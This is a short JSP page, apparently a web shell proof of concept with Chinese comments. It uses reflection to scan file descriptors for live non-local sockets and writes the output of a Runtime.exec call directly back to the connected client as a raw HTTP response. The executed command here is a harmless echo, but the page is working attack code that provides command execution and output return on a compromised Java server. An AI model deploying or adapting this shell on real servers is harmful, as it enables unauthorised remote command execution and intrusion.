<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    //准备工作&初始化
    java.lang.reflect.Field field = java.io.FileDescriptor.class.getDeclaredField("fd");
    field.setAccessible(true);

    Class clazz1 = Class.forName("sun.nio.ch.Net");
    java.lang.reflect.Method method1 = clazz1.getDeclaredMethod("remoteAddress",java.io.FileDescriptor.class);
    method1.setAccessible(true);

    Class clazz2 = Class.forName("java.net.SocketOutputStream", false, null);
    java.lang.reflect.Constructor constructor2 = clazz2.getDeclaredConstructors()[0];
    constructor2.setAccessible(true);

    Class clazz3 = Class.forName("java.net.PlainSocketImpl");
    java.lang.reflect.Constructor constructor3 = clazz3.getDeclaredConstructor(new Class[]{java.io.FileDescriptor.class});
    constructor3.setAccessible(true);

    java.lang.reflect.Method write = clazz2.getDeclaredMethod("write",new Class[]{byte[].class});
    write.setAccessible(true);

    java.net.InetSocketAddress remoteAddress = null;
    java.util.List<Integer> list1 = new java.util.ArrayList<Integer>();
    java.util.List<Integer> list2 = new java.util.ArrayList<Integer>();
    java.io.FileDescriptor fileDescriptor = new java.io.FileDescriptor();

    //第一次尝试
    for(int i = 0; i < 10000; i++){
        field.set(fileDescriptor, i);

        try{
            remoteAddress= (java.net.InetSocketAddress) method1.invoke(null, fileDescriptor);
            if(remoteAddress.toString().startsWith("/127.0.0.1")) continue;
            list1.add(i);
        }catch(Exception e){
            //pass
        }
    }

    //延迟2s
    Thread.sleep(2000);

    //第二次尝试
    for(int i = 0; i < 10000; i++){
        field.set(fileDescriptor, i);

        try{
            remoteAddress = (java.net.InetSocketAddress) method1.invoke(null, fileDescriptor);
            if(remoteAddress.toString().startsWith("/127.0.0.1")) continue;
            list2.add(i);
        }catch(Exception e){
            //pass
        }
    }

    //取交集
    list1.retainAll(list2);

    for(Integer fdVal : list1){
        try{
            field.set(fileDescriptor, fdVal);
            Object socketOutputStream = constructor2.newInstance(new Object[]{constructor3.newInstance(new Object[]{fileDescriptor})});

            String res = new java.util.Scanner(Runtime.getRuntime().exec("echo \"It works!!\"").getInputStream()).useDelimiter("\\A").next();
            String result = "HTTP/1.1 200 OK\nConnection: close\nContent-Length: " + res.length() + "\n\n" + res + "\n";
            write.invoke(socketOutputStream,  new Object[]{result.getBytes()});
        }catch (Exception e){
            //pass
        }
    }
%>